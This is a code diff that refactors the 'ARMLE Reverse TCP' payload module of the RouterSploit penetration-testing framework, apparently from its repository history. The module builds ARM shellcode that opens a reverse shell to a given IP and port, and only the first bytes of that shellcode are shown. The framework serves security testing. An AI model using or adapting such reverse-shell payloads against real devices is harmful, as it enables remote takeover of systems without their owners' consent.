@@ -1,16 +1,11 @@
 from routersploit import (
     exploits,
-    armle,
+    payloads,
     validators,
-    print_success,
-    print_status,
-    print_error,
-    print_info,
-    random_text
 )
 
 
-class Exploit(exploits.Exploit, armle.Armle):
+class Exploit(payloads.Payload):
     __info__ = {
         'name': 'ARMLE Reverse TCP',
         'authors': [
@@ -20,38 +15,13 @@ class Exploit(exploits.Exploit, armle.Armle):
         ],
     }
 
+    architecture = "armle"
     target = exploits.Option('', 'Reverse IP', validators=validators.ipv4)
-    port = exploits.Option(5555, 'Bind port', validators=validators.integer)
+    port = exploits.Option(5555, 'Reverse TCP Port', validators=validators.integer)
 
-    output = exploits.Option('python', 'Output type: elf/python')
-    filepath = exploits.Option('', 'Output file to write (only for elf type)') 
-
-    def __init__(self):
-        self.filepath = "/tmp/{}".format(random_text(8))
-
-    def run(self):
-        print_status("Generating ARMLE Reverse TCP payload")
-        print_status("Reverse IP: {}".format(self.target))
-        print_status("Reverse Port: {}".format(self.port))
-
-        self.generate(self.target, self.port)
-
-        if self.output == "elf":
-            with open(self.filepath, 'w+') as f:
-                print_status("Building ELF payload")
-                content = self.generate_elf()
-
-                print_success("Saving file {}".format(self.filepath))
-                f.write(content)
-
-        elif self.output == "python":
-            print_success("Building payload for python:")
-            content = self.generate_python()
-            print_info(content)
-
-    def generate(self, reverse_ip, reverse_port):
-        reverse_ip = self.convert_ip(reverse_ip)
-        reverse_port = self.convert_port(reverse_port)
+    def generate(self, target, port):
+        reverse_ip = self.convert_ip(target)
+        reverse_port = self.convert_port(port)
 
         self.payload = (
             "\x01\x10\x8F\xE2" +
